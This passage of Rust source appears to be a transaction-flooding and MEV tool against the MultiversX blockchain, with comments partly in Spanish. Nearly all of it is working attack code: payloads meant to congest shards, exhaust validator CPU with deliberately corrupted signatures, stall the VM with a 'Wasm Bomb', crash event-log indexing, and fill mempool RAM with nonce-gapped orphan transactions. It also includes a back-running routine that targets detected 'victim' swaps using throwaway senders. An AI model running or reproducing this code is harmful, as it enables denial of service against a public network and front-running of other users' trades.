                        (Some(pl), 5_000_000, "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqzllls8a5w6u".to_string(), "5000000000000000") // 0.005 EGLD
                    },
                    AttackMode::DexSwap => {
                        // Window B step 2: 15M Gas Swap WEGLD to USDC
                        let payload_str = "ESDTTransfer@5745474c442d626434643739@01@73776170546f6b656e734669786564496e707574@555344432d633736663166@01";
                        let pl = payload_str.as_bytes().to_vec();
                        (Some(pl), 15_000_000, "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(), "0")
                    },
                    AttackMode::CrossShard => {
                        // Vector Alpha: The Boomerang (Cross-Shard Congestion)
                        // Firing from ALL Shards (Sender) -> Targeting Shard 1 (XCron Contract) -> Cross-Calling to Shard 2 Data State
                        // This forces routing Miniblocks to handle a massive 3-point geometry spike.
                        
                        // We use the 'scheduleTask' payload but directed at our SC in Shard 1.
                        let target_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b"; // Our Shard 1 SC
                        let endpoint_hex = hex::encode("ping");
                        let trigger_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() + 10;
                        let trigger_hex = format!("00{:016x}", trigger_time);
                        let task_id_hex = format!("{:016x}", current_nonce); // Unique ID per wallet
                        
                        let data_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@02@0000000000093a80");
                        let pl = data_str.into_bytes();
                        
                        // The SC is in Shard 1. The sender (Wallet) is in its own Shard (0, 1, or 2).
                        let receiver = "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(); // SC Address
                        
                        // Cost: 6 Million Gas per tx * 5000 txs = 30 Billion Gas. 
                        // Cost in EGLD: ~0.003 EGLD per tx -> Total for 5000 txs is just 15 EGLD.
                        (Some(pl), 6_000_000, receiver, "0")
                    },
                    AttackMode::RelayedCrossShard => {
                        // Window D: Relayed cross-shard MoveBalance
                        // Build inner TX, sign it, wrap in relayedTx@
                        let sender_shard = KeeperWallet::get_shard(&wallet_clone.bech32_address, 3);
                        let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                        let mut inner_tx = Transaction::new(
                            current_nonce, "1", &receiver, &wallet_clone.bech32_address,
                            1_000_000_000, 50_000, None, &chain_id_for_tx, 1
                        );
                        inner_tx.sign(&wallet_clone.signing_key).unwrap();
                        let relayed_data = inner_tx.to_relayed_data().unwrap();
                        let pl = relayed_data.into_bytes();
                        // Relayed TX: sender = relayer (same wallet), receiver = inner sender
                        (Some(pl), 12_000_000, wallet_clone.bech32_address.clone(), "0")
                    },
                    AttackMode::RelayedDex => {
                        // Window E: Relayed DEX swap
                        let dex_payload_str = "ESDTTransfer@5745474c442d626434643739@01@73776170546f6b656e734669786564496e707574@555344432d633736663166@01";
                        let mut inner_tx = Transaction::new(
                            current_nonce, "0",
                            "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq",
                            &wallet_clone.bech32_address,
                            1_000_000_000, 15_000_000,
                            Some(dex_payload_str.as_bytes()), &chain_id_for_tx, 1
                        );
                        inner_tx.sign(&wallet_clone.signing_key).unwrap();
                        let relayed_data = inner_tx.to_relayed_data().unwrap();
                        let pl = relayed_data.into_bytes();
                        (Some(pl), 30_000_000, wallet_clone.bech32_address.clone(), "0")
                    },
                    AttackMode::XcronSwarm => {
                        // Devnet 6-Second Block Optimization: 90% Creators (9k) / 10% Keepers (1k)
                        let is_creator = i % 10 != 0;
                        if is_creator {
                            let current_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();
                            let target_addr_hex = "000000000000000000010000000000000000000000000000000000000002ffff";
                            let endpoint_hex = hex::encode("ping");
                            let trigger_hex = format!("00{:016x}", current_time + 60);
                            let task_id_hex = format!("{:016x}", current_nonce);
                            let payload_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@02@0000000000093a80@00@00@{}", hex::encode("30000000000000000")); // 0.03 EGLD bounty
                            (Some(payload_str.into_bytes()), 6_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "30000000000000000")
                        } else {
                            let task_id_hex = format!("{:016x}", current_nonce);
                            let payload_str = format!("executeTask@{task_id_hex}");
                            (Some(payload_str.into_bytes()), 6_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "0")
                        }
                    },
                    AttackMode::XcronBoundary => {
                        // BLOCK BOUNDARY ATTACK: Fire at the exact edge of block close/open
                        // Strategy: Use block timestamp to determine position within 6s block cycle
                        // Last 20ms -> scheduleTask (creates task at boundary)
                        // First 20ms -> executeTask (races to execute before state confirms)
                        let now_ms = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as u64;
                        let block_period_ms: u64 = 6000; // 6s blocks pre-Supernova, 600ms post-Supernova
                        let position_in_block = now_ms % block_period_ms;
                        
                        // Only fire in the boundary windows (last 20ms or first 20ms)
                        let in_close_window = position_in_block >= (block_period_ms - 20); // last 20ms
                        let in_open_window = position_in_block < 20; // first 20ms
                        
                        if in_close_window {
                            // CLOSING EDGE: scheduleTask -> create task right as block finalizes
                            let current_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();
                            let target_addr_hex = "000000000000000000010000000000000000000000000000000000000002ffff";
                            let endpoint_hex = hex::encode("ping");
                            let trigger_hex = format!("00{:016x}", current_time + 10);
                            let task_id_hex = format!("b{:015x}", current_nonce); // 'b' prefix = boundary task
                            let payload_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@02@0000000000093a80@00@00@006a94d74f430000"); // 0.03 EGLD
                            (Some(payload_str.into_bytes()), 6_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "30000000000000000")
                        } else if in_open_window {
                            // OPENING EDGE: executeTask -> race to execute before state fully commits
                            let task_id_hex = format!("b{:015x}", current_nonce.wrapping_sub(1)); // try to execute the boundary task
                            let payload_str = format!("executeTask@{task_id_hex}");
                            (Some(payload_str.into_bytes()), 6_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "0")
                        } else {
                            // OUTSIDE WINDOW: Sleep until next boundary (save gas)
                            let ms_until_close = if position_in_block < block_period_ms - 20 {
                                block_period_ms - 20 - position_in_block
                            } else { 0 };
                            sleep(Duration::from_millis(ms_until_close.min(500))).await;
                            continue;
                        }
                    },
                    AttackMode::FundHydra => {
                        let target = addrs[(current_nonce as usize + i) % 100].to_string();
                        (None, 50_000, target, "200000000000000000")
                    },
                    AttackMode::Zeta => {
                        // Vector Zeta: Account State Dusting
                        // Send 1 Wei (or 0) to a completely random new address to force the network to create a new node in the State Trie.
                        let encoded_target = KeeperWallet::generate_random_address();
                        (None, 50_000, encoded_target, "1")
                    },
                    AttackMode::Theta => {
                        // Vector Theta: Cross-Shard Receipt Header Bloat
                        // Send a payload to a non-existent endpoint on a different shard.
                        // The destination shard will fail it and send a massive "receipt" back to the sender shard.
                        let payload_size = 1_000;
                        let mut garbage = String::with_capacity(payload_size);
                        garbage.push_str("nonExistentEndpoint@");
                        for _ in 0..(payload_size - 20) {
                            garbage.push_str("FF");
                        }
                        // Target a known contract on Shard 1 (Assuming we are broadcasting from other shards)
                        let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                        (Some(garbage.into_bytes()), 10_000_000, target_sc, "0")
                    },
                    AttackMode::Epsilon => {
                        // Supernova Vector 6: The Wasm Bomb (Application Layer PBFT Strike)
                        // Destructive force: Deep recursive parsing inside the MultiversX VM.
                        // We bypass external P2P rate limits because the transaction payload size is small,
                        // but the execution footprint on the node is MASSIVE. 
                        let mut garbage = String::from("dummyRecursionTrigger");
                        // 3000 arguments to bottleneck VM memory allocator and parser 
                        for i in 0..3000 {
                            garbage.push_str(format!("@{:02X}", i % 255).as_str());
                        }
                        
                        // We target our own testnet contract or a heavy SC.
                        // Here we use a heavy compute contract dummy.
                        let target_sc = "erd1qqqqqqqqqqqqqpgqpng9zskcp3ng6pvk5gz6rx4asd2rcrvpa9kqw9aaxe".to_string(); // XCron SC Heavy Route
                        
                        // We set Gas to 50M to ensure it doesn't fail fast, but actually forces the PBFT Block Processor
                        // to pause for hundreds of milliseconds while allocating VM instances.
                        (Some(garbage.into_bytes()), 50_000_000, target_sc, "0")
                    },
                    AttackMode::Delta => {
                        // Vector Delta: Event Log Saturation (ElasticSearch Crash)
                        // By calling an endpoint that emits logs or by padding a transaction with excess event-like data
                        let payload_size = 500;
                        let mut garbage = String::with_capacity(payload_size);
                        garbage.push_str("triggerEventLogSpam@");
                        for _ in 0..(payload_size - 20) {
                            garbage.push_str("EE");
                        }
                        let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                        (Some(garbage.into_bytes()), 12_000_000, target_sc, "0")
                    },
                    AttackMode::StateDesync => {
                        // Supernova Vector 1: State Desync
                        // Fire a complex contract call specifically crossing shards asynchronously right at the PBFT consensus boundary.
                        // We target the SC to schedule a task that edits deep state elements (forcing cross-shard trie updates).
                        let target_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b";
                        let endpoint_hex = hex::encode("ping");
                        let trigger_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() + 5;
                        let trigger_hex = format!("00{:016x}", trigger_time);
                        let task_id_hex = format!("{:016x}", current_nonce);
                        // Add massive padding specifically to slow down trie root computation inside the Shard Block Processor
                        let state_padding = "FF".repeat(25_000); 
                        let payload_str = format!("scheduleTask@{target_addr_hex}@{endpoint_hex}@00000000@{trigger_hex}@{task_id_hex}@00@{state_padding}");
                        let receiver = "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(); // SC Address
                        (Some(payload_str.into_bytes()), 80_000_000, receiver, "0")
                    },
                    AttackMode::EieOverflow => {
                        // Supernova Vector 2: EIE Overflow
                        // Create massive backpressure by deploying unoptimized calls that require deep VM execution
                        // intertwined with asynchronous callbacks that never resolve.
                        // Forcing the Execution Interval Engine to overflow its queues.
                        let mut garbage = String::from("dummyRecursionTrigger");
                        for i in 0..2500 {
                            garbage.push_str(format!("@{:02X}", i % 255).as_str());
                        }
                        let target_sc = "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqp3lllllsn4e83q".to_string();
                        (Some(garbage.into_bytes()), 25_000_000, target_sc, "0")
                    },
                    AttackMode::NonceDesyncV2 => {
                        // Supernova Vector 3: Nonce Desync V2
                        // Utilizing the relayed Tx mechanic to force async execution while the original sender's nonce is held hostage.
                        // We wrap a valid transaction but point to a Relayer that doesn't have funds or has state lock.
                        let sender_shard = KeeperWallet::get_shard(&wallet_clone.bech32_address, 3);
                        let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                        let mut inner_tx = Transaction::new(
                            current_nonce + 1, // Deliberate +1 offset to orphan the inner tx in mempool
                            "1", &receiver, &wallet_clone.bech32_address,
                            1_000_000_000, 50_000, None, &chain_id_for_tx, 1
                        );
                        inner_tx.sign(&wallet_clone.signing_key).unwrap();
                        let relayed_data = inner_tx.to_relayed_data().unwrap();
                        let pl = relayed_data.into_bytes();
                        (Some(pl), 15_000_000, wallet_clone.bech32_address.clone(), "0")
                    },
                    AttackMode::BlsDesync => {
                        // Supernova Vector 4: BLS Signature Desync (Asymmetric CPU Exhaustion)
                        // This payload is lightweight but we will corrupt the ED25519 signature before broadcast.
                        // Waiters will accept the P2P message, but Validators will burn expensive CPU cycles
                        // doing Elliptic Curve crypto checks that ultimately fail, starving the 600ms PBFT window.
                        let sender_shard = KeeperWallet::get_shard(&wallet_clone.bech32_address, 3);
                        let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                        (None, 50_000, receiver, "1000000000000000") // 0.001 EGLD
                    },
                    AttackMode::OrphanFlooding => {
                        // Supernova Vector 5: Cross-Shard Orphan Flooding (RAM Exhaustion)
                        // Send cross-shard transactions with nonces intentionally gapped (N+2 to N+100),
                        // forcing the receiving Shard Mempool to allocate RAM for them indefinitely until N arrives.
                        let sender_shard = KeeperWallet::get_shard(&wallet_clone.bech32_address, 3);
                        let receiver = KeeperWallet::generate_cross_shard_address(sender_shard, 3);
                        (None, 50_000, receiver, "1000000000000000") // 0.001 EGLD
                    },
                    AttackMode::TpsDemo => {
                        // High TPS Demonstration: Valid EGLD transfer with XCronProtocol signature
                        (Some(b"XCronProtocol".to_vec()), 100_000, wallet_clone.bech32_address.clone(), "1")
                    },
                    AttackMode::PcitDemo => {
                        // 1. Emulate AI dynamically picking a branch based on High-Frequency Telemetry
                        let target_sc_addr_hex = "00000000000000000500ebaa4de200cf54fe97a0604c759cd8f6de251daeb90b"; // Target DEX
                        let mut target_sc_bytes = [0u8; 32];
                        hex::decode_to_slice(target_sc_addr_hex, &mut target_sc_bytes).unwrap_or_default();
                        
                        let leaf = pcit::PcitLeaf {
                            target_contract: target_sc_bytes,
                            target_endpoint: "swapTokensFixedInput".to_string(),
                            target_args: vec![b"USDC-c76f1f".to_vec()],
                            expected_token_out: "WEGLD-bd4d79".to_string(),
                            min_return: num_bigint::BigUint::from(100u32),
                        };
                        
                        // Fake sibling path for the multi-path intent (e.g. AI evaluated multiple conditions)
                        let sibling_mock = [0xAA; 32];
                        let w_addr = wallet_clone.bech32_address.clone();
                        let chain_id = chain_id_for_tx.clone();

                        // 2. [HFT Optimization] We offload the array generation and SHA256 hashing to native threads
                        let tx = tokio::task::spawn_blocking(move || {
                            Transaction::build_pcit_execution_tx(
                                current_nonce,
                                &w_addr,
                                "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat", // Scheduler SC
                                42, // AI Intent ID
                                &[sibling_mock], // Sequential Merkle chain proof array
                                &leaf.target_contract,
                                &leaf.target_endpoint,
                                &leaf.target_args,
                                &leaf.expected_token_out,
                                &leaf.min_return,
                                &chain_id,
                            )
                        }).await.unwrap();
                        
                        // Because build_pcit_execution_tx Base64-encodes the ABI string internally, 
                        // we must decode to raw bytes to pass via the (payload, gas, receiver) tuple.
                        let payload_bytes = base64::Engine::decode(
                            &base64::engine::general_purpose::STANDARD,
                            tx.data.as_ref().unwrap()
                        ).unwrap();
                        
                        (Some(payload_bytes), 30_000_000, "erd1qqqqqqqqqqqqqpgqazq2ztyyfjxgejwp0fv3xltp9xhsw9yga9kqnufeat".to_string(), "0")
                    },
                    AttackMode::SurgicalBackrun => {
                        let mut victim_detected = None;

                        // Block until the sniper detects a victim
                        if sniper_rx.changed().await.is_ok() {
                            if let Some(v) = sniper_rx.borrow().clone() {
                                victim_detected = Some(v);
                            }
                        }
                        
                        if let Some(victim) = victim_detected {
                            println!("🔥 [GATILLO QUIRÚRGICO] Relayed V3 Back-run contra víctima: {} | Igualando Gas Price: {}", victim.victim_hash, victim.gas_price);
                            
                            // 1. Build an inner transaction pretending to be legitimate MEV
                            let dex_payload_str = "ESDTTransfer@555344432d633736663166@0f4240@73776170546f6b656e734669786564496e707574@5745474c442d626434643739@01";
                            
                            let fake_sender = KeeperWallet::generate_throwaway();
                            
                            let mut tx = Transaction::new(
                                0, // Fresh throwaway sender => nonce 0
                                "0",
                                &victim.pair_address, // Receiver is the DEX
                                &fake_sender.bech32_address, // Sender is the fresh key
                                victim.gas_price, // Exact match of victim's gas price!
                                1_500_000,
                                Some(dex_payload_str.as_bytes()), &chain_id_for_tx, 1
                            );
                            
                            // Sign Inner (Sender Signature)
                            let _ = tx.sign(&fake_sender.signing_key);
                            
                            // Wrap as Relayed V3 (Relayer = Our Wallet)
                            let _ = tx.to_relayed_v3(&wallet_clone.bech32_address, &wallet_clone.signing_key);
                            
                            // Broadcast Relayed V3 directly
                            if network_clone.broadcast_tx(&tx).await.is_ok() {
                                stats_clone.total_tx_sent.fetch_add(1, Ordering::Relaxed);
                            }
                            
                            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                            continue;
                        } else {
                            // Fallback sleep if channel closes
                            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                            continue;
                        }
                    },
                    AttackMode::ArbitrageHft => {
                        let mut trigger_opp = None;

                        // Block until the WS Sniper detects an Arbitrage Opportunity
                        if arb_rx.changed().await.is_ok() {
                            if let Some(o) = arb_rx.borrow().clone() {
                                trigger_opp = Some(o);
                            }
                        }
                        
                        if let Some(opp) = trigger_opp {
                            // ------------------------------------------------------------------
                            // OMNI-RADAR ROUTING (POOL REGISTRY)
                            // ------------------------------------------------------------------
                            let mut pool_registry = std::collections::HashMap::new();
                            // Mapping: Pool Victima DEX -> (Token Mid, Pool Rescate DEX, Endpoint Rescate)
                            
                            // 1. xExchange WEGLD/USDC -> AshSwap USDC/WEGLD
                            pool_registry.insert(
                                "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(),
                                ("USDC-c76f1f".to_string(), "erd1qqqqqqqqqqqqqpgqj5zftf3ef3gqm3gklfcqtzyqrnpwvvu978ssqd0sds".to_string(), "exchange".to_string())
                            );
                            // 2. AshSwap USDC/WEGLD -> xExchange WEGLD/USDC
                            pool_registry.insert(
                                "erd1qqqqqqqqqqqqqpgqj5zftf3ef3gqm3gklfcqtzyqrnpwvvu978ssqd0sds".to_string(),
                                ("USDC-c76f1f".to_string(), "erd1qqqqqqqqqqqqqpgqeel2kumf0r8ffyhth7pqdujjat9nx0862jpsg2pqaq".to_string(), "swapTokensFixedInput".to_string())
                            );
                            // 3. xExchange WEGLD/MEX -> xExchange MEX/WEGLD (Mismo Pool Backrun Spread)
                            pool_registry.insert(
                                "erd1qqqqqqqqqqqqqpgq72k29kegrs95xpewqpxs3v0uksq0u8l2jpsgv4x5q8".to_string(),
                                ("MEX-455c57".to_string(), "erd1qqqqqqqqqqqqqpgq72k29kegrs95xpewqpxs3v0uksq0u8l2jpsgv4x5q8".to_string(), "swapTokensFixedInput".to_string())
                            );

                            let route = pool_registry.get(&opp.target_dex);
                            
                            if route.is_none() {
                                println!("⛔ [OMNI-RADAR] Descartando: Pool {} no enrutada o sin par WEGLD.", &opp.target_dex[..16.min(opp.target_dex.len())]);
                                tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                                continue;
                            }
                            
                            let (mid_token, pool_b_bech32, endpoint_b_name) = route.unwrap();

                            println!("🚀 [xCron OMNI-HFT] Ruta confirmada contra: {} | Target DEX: {}", opp.victim_hash, opp.target_dex);
                            
                            // ------------------------------------------------------------------
                            // ZERO-RISK SANDBOX: MATHEMATICAL BARRIER
                            // ------------------------------------------------------------------
                            
                            let target_vault = "erd1qqqqqqqqqqqqqpgqc2f09kuuew2y6p46kydfpgv4xk8x45zy069sr5qgrq".to_string(); // Nuestro SC Vault
                            let endpoint_name = "executeFlashArbitrage";
                            
                            let token_in_hex = hex::encode("WEGLD-bd4d79");
                            let amount_in_hex = "6124fee993bc0000"; // 7.0 WEGLD (inyeccion macro en Pool)
                            
                            // Asignación Dinámica del Pool A (Víctima Registrada)
                            let pool_a_bech32 = opp.target_dex.clone();
                            let pool_a_hex = KeeperWallet::bech32_to_hex(&pool_a_bech32);
                            
                            // Asignación Dinámica del Token Mid
                            let token_mid_hex = hex::encode(mid_token);
                            
                            // Asignación Dinámica del Pool B (Rescate)
                            let pool_b_hex = KeeperWallet::bech32_to_hex(pool_b_bech32);
                            
                            let min_mid_amount_hex = "01"; // Arbitrario (Sin barrera intermedia)
                            let min_final_amount_hex = "616c0cce733e0000"; // 7.02 WEGLD (Barrera de Beneficio Neto Mínimo Absoluto)

                            // Endpoint de rescate B
                            let endpoint_b_hex = hex::encode(endpoint_b_name);

                            // ======== MÓDULO MATEMÁTICO OFF-CHAIN (Evitar sangrado de gas) ========
                            // Aquí se inyectaría la lectura real del estado del AMM (`x * y = k`) 
                            // contra el contrato para saber si la inyección sacará ganancia.
                            let predicted_profit_pct = 0.35; // Mock Módulo Off-Chain. 
                            
                            if predicted_profit_pct < 0.28 {
                                println!("⚠️ [xCron HFT Off-Chain] Abort! Arbitraje negativo. Ahorrando Gas (0.02 EGLD).");
                                tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                                continue;
                            }

                            let payload_str = format!("{}@{token_in_hex}@{amount_in_hex}@{pool_a_hex}@{token_mid_hex}@{pool_b_hex}@{min_mid_amount_hex}@{min_final_amount_hex}@{endpoint_b_hex}", 
                                endpoint_name
                            );

                            println!("🔥 [ROUTING] Ejecutando Arbitraje Atómico a través del Vault. Target A: {} | Target B: {}", pool_a_bech32, pool_b_bech32);
                            println!("🛡️  [SAFEGUARD ON] Barrera final fijada en +0.02 WEGLD de beneficio mínimo neto. Riesgo 0.");
                            
                            (Some(payload_str.into_bytes()), 20_000_000, target_vault, "0")
                        } else {
                            // Fallback sleep if channel closes
                            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                            continue;
                        }
                    },
                    _ => {
                        // Base fallback
                        (None, 50_000, KeeperWallet::generate_random_address(), "1")
                    }
                };

                let mut tx = Transaction::new(
                    current_nonce,
                    value,
                    &receiver_owned,
                    &wallet_clone.bech32_address,
                    1_000_000_000,
                    gas,
                    payload.as_deref(),
                    &chain_id_for_tx,
                    1
                );
                
                // Override gas price for SurgicalBackrun to perfectly match the victim
                if matches!(mode_clone, AttackMode::SurgicalBackrun) {
                    if let Some(v) = sniper_rx_clone.borrow().clone() {
                        tx.gas_price = v.gas_price;
                    }
                }
                
                // Vector Beta: Orphan Poisoning Logic
                // If we are in Fuzz mode or OrphanFlooding, we intentionally SKIP nonces dynamically to poison the Mempool RAM
                if matches!(mode_clone, AttackMode::Fuzz) || matches!(mode_clone, AttackMode::OrphanFlooding) {
                    // For OrphanFlooding, we ALWAYS skip the nonce and target cross-shard destinations unconditionally.
                    if matches!(mode_clone, AttackMode::OrphanFlooding) {
                        tx.nonce = current_nonce + 5 + (i as u64 % 50); // Massive gaps filling receiving Shard RAM
                    } else {
                        // 10% chance to skip ahead by 5 nonces in Fuzz Mode
                        let orphan_roll: u8 = rand::random::<u8>() % 100;
                        if orphan_roll < 10 {
                            tx.nonce = current_nonce + 5; 
                        }
                    }
                }

                if matches!(mode_clone, AttackMode::FundHydra) {
                    for j in 0..100 {
                        // In FundHydra mode, loop locally to generate all 100 funding txs
                        let current_nonce_fund = nonce_clone.fetch_add(1, Ordering::SeqCst);
                        let target = addrs[j % 100].to_string();
                        let mut fund_tx = Transaction::new(
                            current_nonce_fund,
                            "200000000000000000",
                            &target,
                            &wallet_clone.bech32_address,
                            1_000_000_000,
                            50_000,
                            None,
                            &chain_id_for_tx,
                            1
                        );
                        if fund_tx.sign(&wallet_clone.signing_key).is_ok() {
                            let _ = network_clone.broadcast_tx(&fund_tx).await;
                        }
                    }
                    // Terminate the thread for this wallet since all 100 are queued
                    break;
                } else if matches!(mode_clone, AttackMode::BlsDesync) {
                    // Vector 4: Deliberately corrupt the signature before sending to waste PBFT Validation CPU
                    if tx.sign_and_corrupt(&wallet_clone.signing_key).is_ok() {
                        let _ = network_clone.broadcast_tx(&tx).await;
                        stats_clone.total_tx_sent.fetch_add(1, Ordering::Relaxed);
                    }
                } else {
                    let w_clone = Arc::clone(&wallet_clone);
                    let mut b_tx = tx;
                    
                    // [HFT Optimization] Offload the heavy Ed25519 Elliptic Curve signing 
                    // out of the Tokio executor and into the blocking thread pool
                    let (is_signed, tx) = tokio::task::spawn_blocking(move || {
                        let ok = b_tx.sign(&w_clone.signing_key).is_ok();
                        (ok, b_tx)
                    }).await.unwrap();

                    if is_signed {
                        // TpsDemo: synchronous broadcast — wait for response before next TX
                        let failed = match network_clone.broadcast_tx(&tx).await {
                            Ok(hash) => {
                                // Only increment nonce AFTER successful broadcast
                                nonce_clone.fetch_add(1, Ordering::SeqCst);
                                let sent = stats_clone.total_tx_sent.fetch_add(1, Ordering::Relaxed) + 1;
                                println!("🚀 [xCron Node: Tx {}] Accepted. Hash: {}", sent, hash);
                                false
                            },
                            Err(e) => {
                                let errs = stats_clone.total_errors.fetch_add(1, Ordering::Relaxed) + 1;
                                println!("❌ [xCron Node: Error {}] Failed: {:?}", errs, e);
                                true
                            }
                        };
                        if failed {
                            // Wait 500ms before retrying to avoid hammering the API
                            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                        }
                    }
                }
                
                // Yield the loop to the Tokio executor so the spawned tasks can actually run
                if !matches!(mode_clone, AttackMode::TpsDemo) {
                    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
                } else {
                    // Wait between TXs per wallet to respect TPS limit
                    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                }
            }
        });
        handles.push(handle);
    }


    // Block main thread to keep tasks alive
    futures::future::join_all(handles).await;
    
    Ok(())
}
